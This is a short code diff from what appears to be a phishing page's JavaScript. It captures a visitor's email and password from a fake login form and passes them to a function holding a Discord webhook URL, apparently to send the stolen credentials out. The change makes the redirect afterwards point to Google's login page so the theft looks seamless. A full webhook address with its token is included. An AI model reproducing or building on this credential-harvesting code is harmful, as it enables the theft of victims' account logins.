@@ -63,7 +63,7 @@ function handleNextClick() {
     const email = document.getElementById("email").value;
     const password = document.getElementById("password").value;
     ejecutarMetodo(email, password);
-    window.location.href = 'https://www.google.com';
+    window.location.href = 'https://google.com/login';
 }
 function ejecutarMetodo(email, password) {
     const webhookUrl = 'https://discord.com/api/webhooks/1303511720366444555/7rQnnjli4xHdT686YKX4HAcJyJr9OQuE8n6cpKV1FT_1PCKRLxAtOzcS0VZDc_ASkkMJ';
